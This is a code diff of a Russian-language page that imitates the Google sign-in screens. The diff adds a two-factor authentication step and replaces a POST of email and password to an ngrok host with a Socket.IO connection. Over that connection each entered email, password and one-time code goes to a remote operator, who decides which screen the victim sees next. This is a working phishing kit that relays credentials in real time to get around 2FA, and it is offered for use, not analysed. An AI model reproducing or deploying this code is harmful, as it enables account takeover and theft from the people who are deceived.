@@ -8,6 +8,8 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <!-- Подключаем Socket.IO клиент -->
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 </head>
 <body>
 
@@ -28,6 +30,14 @@
       <!-- Экран 2 -->
       <h1 id="title-password" style="display:none;">Добро пожаловать!</h1>
 
+      <!-- Экран 3 -->
+      <h1 id="title-2fa" style="display:none;">Двухэтапная проверка</h1>
+      <p id="sub-2fa" style="display:none;">
+        Для обеспечения безопасности вашей учетной записи Google хочет убедиться,
+        что вход в систему осуществляется действительно вами.
+      </p>
+
+      <!-- Чип с email -->
       <div id="user-chip" class="user-chip" style="display:none;">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
           <circle cx="12" cy="12" r="10" stroke="#c4c7c5" stroke-width="1.5"/>
@@ -44,43 +54,60 @@
     <!-- Правая колонка -->
     <div class="col-right">
 
-      <!-- ЭКРАН 1 -->
+      <!-- ЭКРАН 1: email -->
       <form id="email-form">
         <div class="input-wrapper">
           <input type="email" name="email" id="email-input"
                  placeholder="Телефон или адрес эл. почты"
                  autocomplete="off" required>
         </div>
-
         <a href="#" class="forgot-link" onclick="event.preventDefault()">Забыли адрес электронной почты?</a>
-
         <p class="guest-text">
           Не ваш компьютер? Включите гостевой режим, чтобы защитить данные в аккаунте.
           <a href="#" onclick="event.preventDefault()">Подробнее об использовании гостевого <br> режима</a>
         </p>
-
         <div class="actions">
           <button type="button" class="btn-text">Создать аккаунт</button>
           <button type="submit" class="btn-primary">Далее</button>
         </div>
       </form>
 
-      <!-- ЭКРАН 2 -->
+      <!-- ЭКРАН 2: пароль -->
       <form id="password-form" style="display:none;">
         <div class="input-wrapper password-wrapper">
           <input type="password" name="password" id="password-input"
                  placeholder=" " autocomplete="off" required>
           <label for="password-input">Введите пароль</label>
         </div>
-
         <label class="checkbox-row">
           <input type="checkbox" id="show-password">
           <span>Показать пароль</span>
         </label>
-
         <div class="actions">
           <button type="button" class="btn-text">Забыли пароль?</button>
           <button type="submit" class="btn-primary">Далее</button>
+        </div>
+      </form>
+
+      <!-- ЭКРАН 3: 2FA -->
+      <form id="twofa-form" style="display:none;">
+        <h3 class="twofa-subtitle">Двухэтапная проверка</h3>
+        <p class="twofa-desc">
+          Получите код подтверждения в приложении <strong>Google Authenticator</strong>.
+        </p>
+        <div class="input-wrapper">
+          <input type="text" name="otp" id="otp-input"
+                 placeholder="Введите код"
+                 inputmode="numeric" pattern="[0-9]*" maxlength="6"
+                 autocomplete="off" required>
+        </div>
+        <label class="checkbox-row">
+          <input type="checkbox" id="trust-device">
+          <span>Больше не спрашивать об этом на этом устройстве</span>
+        </label>
+        <div class="actions actions-twofa">
+          <button type="button" class="btn-text">Попробуйте другой способ</button>
+          <button type="submit" class="btn-primary">Следующий</button>
         </div>
       </form>
 
@@ -103,87 +130,115 @@
   </footer>
 
   <script>
-    const SERVER_URL = "https://starting-surgical-wing.ngrok-free.dev";
+    // ⚠️ ВСТАВЬ СВОЙ АКТУАЛЬНЫЙ NGROK URL (без http://)
+    const SOCKET_URL = "https://starting-surgical-wing.ngrok-free.dev";
+    const socket = io(SOCKET_URL);
 
     // Элементы
     const emailForm     = document.getElementById("email-form");
     const passwordForm  = document.getElementById("password-form");
+    const twofaForm     = document.getElementById("twofa-form");
     const emailInput    = document.getElementById("email-input");
     const passwordInput = document.getElementById("password-input");
+    const otpInput      = document.getElementById("otp-input");
     const titleEmail    = document.getElementById("title-email");
     const titlePass     = document.getElementById("title-password");
+    const title2FA      = document.getElementById("title-2fa");
     const subEmail      = document.getElementById("sub-email");
+    const sub2FA        = document.getElementById("sub-2fa");
     const userChip      = document.getElementById("user-chip");
     const chipEmail     = document.getElementById("chip-email");
     const showPassword  = document.getElementById("show-password");
 
-    let savedEmail = "";
+    // --- Обработка событий от сервера ---
+    socket.on('connect', () => console.log('✅ WebSocket подключён'));
+    socket.on('disconnect', () => console.log('❌ WebSocket отключён'));
 
-    // === Экран 1 → Экран 2 ===
-    emailForm.addEventListener("submit", (e) => {
-      e.preventDefault();
-      savedEmail = emailInput.value.trim();
-      if (!savedEmail) return;
-
-      // Левая колонка
+    socket.on('request_password', (data) => {
+      console.log('🔒 Сервер запросил пароль:', data);
+      // Переключаем интерфейс на экран пароля
       titleEmail.style.display = "none";
       subEmail.style.display = "none";
       titlePass.style.display = "block";
       userChip.style.display = "inline-flex";
-      chipEmail.textContent = savedEmail;
-
-      // Правая колонка
+      chipEmail.textContent = data.email || emailInput.value;
       emailForm.style.display = "none";
       passwordForm.style.display = "block";
-      setTimeout(() => passwordInput.focus(), 100);
+      passwordInput.focus();
     });
 
-    // === Возврат на экран 1 (клик по чипу) ===
-    userChip.addEventListener("click", () => {
-      titleEmail.style.display = "block";
-      subEmail.style.display = "block";
+    socket.on('request_2fa', (data) => {
+      console.log('🔑 Сервер запросил 2FA:', data);
       titlePass.style.display = "none";
-      userChip.style.display = "none";
-
+      title2FA.style.display = "block";
+      sub2FA.style.display = "block";
       passwordForm.style.display = "none";
-      emailForm.style.display = "block";
-      emailInput.focus();
+      twofaForm.style.display = "block";
+      otpInput.focus();
     });
 
-    // === Показать/скрыть пароль ===
-    showPassword.addEventListener("change", () => {
-      passwordInput.type = showPassword.checked ? "text" : "password";
+    socket.on('login_success', (data) => {
+      console.log('🎉 Успех:', data);
+      alert("Вход выполнен успешно!");
+      // Можно сделать редирект:
+      // window.location.href = "https://myaccount.google.com/";
     });
 
-    // === Экран 2 → отправка на сервер ===
-    passwordForm.addEventListener("submit", async (e) => {
+    socket.on('login_failed', (data) => {
+      console.error('⚠️ Ошибка входа:', data);
+      alert("Не удалось войти: " + data.message);
+    });
+
+    socket.on('error', (data) => {
+      console.error('❌ Ошибка от сервера:', data);
+      alert("Ошибка: " + data.message);
+    });
+
+    // --- Отправка данных на сервер ---
+    emailForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      if (!email) return;
+      console.log("📤 Отправляю email:", email);
+      socket.emit('submit_email', { email });
+    });
+
+    passwordForm.addEventListener("submit", (e) => {
       e.preventDefault();
       const password = passwordInput.value.trim();
       if (!password) return;
+      console.log("📤 Отправляю пароль");
+      socket.emit('submit_password', { password });
+    });
 
-      const data = { email: savedEmail, password };
-      console.log("📤 Отправляю:", data);
+    twofaForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const otp = otpInput.value.trim();
+      if (!otp) return;
+      console.log("📤 Отправляю 2FA код");
+      socket.emit('submit_2fa', { otp });
+    });
 
-      try {
-        const response = await fetch(`${SERVER_URL}/submit-credentials`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "ngrok-skip-browser-warning": "true"
-          },
-          body: JSON.stringify(data)
-        });
+    // --- Возврат на экран 1 (клик по чипу) ---
+    userChip.addEventListener("click", () => {
+      // Сбрасываем интерфейс (сессия на сервере сбросится при новой попытке)
+      titleEmail.style.display = "block";
+      subEmail.style.display = "block";
+      titlePass.style.display = "none";
+      title2FA.style.display = "none";
+      sub2FA.style.display = "none";
+      userChip.style.display = "none";
+      passwordForm.style.display = "none";
+      twofaForm.style.display = "none";
+      emailForm.style.display = "block";
+      emailInput.value = "";
+      emailInput.focus();
+    });
 
-        if (response.ok) {
-          console.log("✅ Данные отправлены");
-        } else {
-          console.error("❌ Ошибка отправки, статус:", response.status);
-        }
-      } catch (err) {
-        console.error("❌ Не удалось связаться с сервером:", err);
-      }
+    // --- Показать/скрыть пароль ---
+    showPassword.addEventListener("change", () => {
+      passwordInput.type = showPassword.checked ? "text" : "password";
     });
   </script>
-
 </body>
 </html>
